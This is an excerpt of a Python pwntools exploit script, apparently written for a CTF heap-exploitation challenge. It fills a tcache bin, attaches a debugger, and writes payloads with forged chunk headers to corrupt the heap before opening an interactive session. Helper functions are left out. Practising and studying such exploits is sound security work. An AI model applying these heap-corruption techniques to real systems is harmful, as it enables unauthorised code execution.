...
if __name__=="__main__":
    ...
    for i in xrange(7):
       add(a,0x150,str(chr(ord('1')+i))*0x150)             # fill 0x1f0 tcache
       free(a)
    ...
    gdb.attach(io)
    payload = "\x00"*0xf8 + p64(0xf1)+"\x00"*0x50
    add(b,0x150,payload)

    free(a)

    payload = ("\x00"*88 + p64(0x61) + p64(0xdeadbeef)*2+p64(0)*8+p64(0x60)+p64(0x31)).ljust(0xe0,"\x00")
    add(a,0xe0,"\x00"*0xe0)
    free(b)
    io.interactive()
